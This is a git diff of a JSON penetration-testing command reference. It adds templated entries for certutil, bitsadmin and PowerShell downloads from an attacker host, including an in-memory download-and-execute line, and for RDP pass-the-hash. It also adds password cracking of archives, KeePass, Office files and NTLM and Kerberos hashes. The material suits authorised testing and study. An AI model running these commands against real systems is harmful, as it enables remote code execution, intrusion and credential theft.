@@ -120,7 +120,7 @@
     "category": "Kerberos",
     "name": "GetNPUsers (AS-REP Roast)",
     "command": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -no-pass -dc-ip <ip> -outputfile asrep_hashes.txt",
-    "description": "AS-REP Roasting \u2014 get hashes for accounts without pre-auth",
+    "description": "AS-REP Roasting - get hashes for accounts without pre-auth",
     "tags": [
       "kerberos",
       "asrep",
@@ -132,7 +132,7 @@
     "category": "Kerberos",
     "name": "GetUserSPNs (Kerberoast)",
     "command": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerberoast_hashes.txt",
-    "description": "Kerberoasting \u2014 extract TGS hashes for cracking",
+    "description": "Kerberoasting - extract TGS hashes for cracking",
     "tags": [
       "kerberos",
       "kerberoast",
@@ -212,6 +212,304 @@
       "john",
       "crack",
       "password"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "Certutil Download",
+    "command": "certutil -urlcache -f http://<lhost>/<file> <file>",
+    "description": "Download file via certutil (Windows)",
+    "tags": [
+      "windows",
+      "download",
+      "certutil"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "Certutil Download (split)",
+    "command": "certutil -urlcache -split -f http://<lhost>/<file> C:\\Users\\Public\\<file>",
+    "description": "Download file via certutil with split flag",
+    "tags": [
+      "windows",
+      "download",
+      "certutil"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "BITSAdmin Download",
+    "command": "bitsadmin /transfer job http://<lhost>/<file> C:\\Users\\Public\\<file>",
+    "description": "Download file via BITSAdmin (Windows)",
+    "tags": [
+      "windows",
+      "download",
+      "bitsadmin"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "PowerShell iwr",
+    "command": "iwr -Uri http://<lhost>/<file> -OutFile <file>",
+    "description": "Download file via Invoke-WebRequest (short form)",
+    "tags": [
+      "windows",
+      "powershell",
+      "download"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "PowerShell Invoke-WebRequest",
+    "command": "Invoke-WebRequest -Uri http://<lhost>/<file> -OutFile C:\\Users\\Public\\<file>",
+    "description": "Download file via Invoke-WebRequest (full)",
+    "tags": [
+      "windows",
+      "powershell",
+      "download"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "PowerShell Download & Execute",
+    "command": "(New-Object System.Net.WebClient).DownloadString('http://<lhost>/<file>.ps1') | IEX",
+    "description": "Download and execute PowerShell script in memory",
+    "tags": [
+      "windows",
+      "powershell",
+      "download",
+      "execute"
+    ]
+  },
+  {
+    "category": "Remote",
+    "name": "xfreerdp3 (Password)",
+    "command": "xfreerdp3 /v:<ip> /u:<user> /p:<password> /dynamic-resolution /cert:ignore +clipboard",
+    "description": "RDP connection with password",
+    "tags": [
+      "rdp",
+      "remote",
+      "windows",
+      "xfreerdp"
+    ]
+  },
+  {
+    "category": "Remote",
+    "name": "xfreerdp3 (Pass-the-Hash)",
+    "command": "xfreerdp3 /v:<ip> /u:<user> /pth:<ntlm> /dynamic-resolution /cert:ignore +clipboard",
+    "description": "RDP via Pass-the-Hash (NTLM)",
+    "tags": [
+      "rdp",
+      "remote",
+      "windows",
+      "pth",
+      "xfreerdp"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "ZIP - fcrackzip",
+    "command": "fcrackzip -u -D -p <wordlist> <file>.zip",
+    "description": "Crack ZIP password with fcrackzip",
+    "tags": [
+      "crack",
+      "zip",
+      "fcrackzip",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "ZIP - John",
+    "command": "zip2john <file>.zip > zip.john && john zip.john",
+    "description": "Crack ZIP password with John the Ripper",
+    "tags": [
+      "crack",
+      "zip",
+      "john",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "7z - 7za wordlist",
+    "command": "cat <wordlist> | 7za t <file>.7z",
+    "description": "Brute-force 7z archive with wordlist",
+    "tags": [
+      "crack",
+      "7z",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "7z - John",
+    "command": "7z2john <file>.7z > 7zhash.john && john 7zhash.john",
+    "description": "Crack 7z password with John the Ripper",
+    "tags": [
+      "crack",
+      "7z",
+      "john",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "PDF - pdfcrack",
+    "command": "pdfcrack <file>.pdf -w <wordlist>",
+    "description": "Crack PDF password with pdfcrack",
+    "tags": [
+      "crack",
+      "pdf",
+      "pdfcrack",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "PDF - Decrypt (qpdf)",
+    "command": "qpdf --password=<password> --decrypt <encrypted_pdf>.pdf <plaintext_pdf>.pdf",
+    "description": "Decrypt PDF once password is known",
+    "tags": [
+      "crack",
+      "pdf",
+      "qpdf",
+      "decrypt"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "KeePass KDBX - John",
+    "command": "keepass2john <file>.kdbx > kdbx.hash && john --wordlist=<wordlist> kdbx.hash",
+    "description": "Crack KeePass database with John",
+    "tags": [
+      "crack",
+      "keepass",
+      "kdbx",
+      "john",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Office (XLS/PPT/DOC) - John",
+    "command": "office2john <file> > office.hash && john --wordlist=<wordlist> office.hash",
+    "description": "Crack Office document password with John",
+    "tags": [
+      "crack",
+      "office",
+      "john",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - MD5 / WordPress / Joomla",
+    "command": "hashcat -a 0 -m 400 <hashfile> <wordlist>",
+    "description": "Crack MD5 (phpass) — WordPress / Joomla",
+    "tags": [
+      "crack",
+      "hashcat",
+      "md5",
+      "wordpress",
+      "joomla"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - MD5 + Rules",
+    "command": "hashcat -a 0 -m 400 <hashfile> <wordlist> -r /usr/share/doc/hashcat/rules/best64.rule",
+    "description": "Crack MD5 (phpass) with best64 rules",
+    "tags": [
+      "crack",
+      "hashcat",
+      "md5",
+      "rules"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - Kerberoast (TGS)",
+    "command": "hashcat -m 13100 -a 0 <hashfile> <wordlist>",
+    "description": "Crack Kerberos TGS hashes after Kerberoasting",
+    "tags": [
+      "crack",
+      "hashcat",
+      "kerberos",
+      "kerberoast"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - LM",
+    "command": "hashcat -m 3000 -a 0 <hashfile> <wordlist>",
+    "description": "Crack LM hashes",
+    "tags": [
+      "crack",
+      "hashcat",
+      "lm",
+      "windows"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - NTLM",
+    "command": "hashcat -m 1000 -a 0 <hashfile> <wordlist>",
+    "description": "Crack NTLM hashes",
+    "tags": [
+      "crack",
+      "hashcat",
+      "ntlm",
+      "windows"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - NTLMv1",
+    "command": "hashcat -m 5500 -a 0 <hashfile> <wordlist>",
+    "description": "Crack NTLMv1 hashes",
+    "tags": [
+      "crack",
+      "hashcat",
+      "ntlmv1",
+      "windows"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - NTLMv2",
+    "command": "hashcat -m 5600 -a 0 <hashfile> <wordlist>",
+    "description": "Crack NTLMv2 hashes (e.g. from Responder)",
+    "tags": [
+      "crack",
+      "hashcat",
+      "ntlmv2",
+      "windows",
+      "responder"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - NTLMv2 Combination",
+    "command": "hashcat -m 5600 -a 1 <hashfile> <wordlist> <wordlist>",
+    "description": "Crack NTLMv2 with combination attack",
+    "tags": [
+      "crack",
+      "hashcat",
+      "ntlmv2",
+      "combination"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - Generate Wordlist from Rules",
+    "command": "cat <keywords>.txt | hashcat -r <rule_file> --stdout > <wordlist>",
+    "description": "Generate custom wordlist by applying rules to keywords",
+    "tags": [
+      "crack",
+      "hashcat",
+      "wordlist",
+      "rules"
     ]
   }
 ]
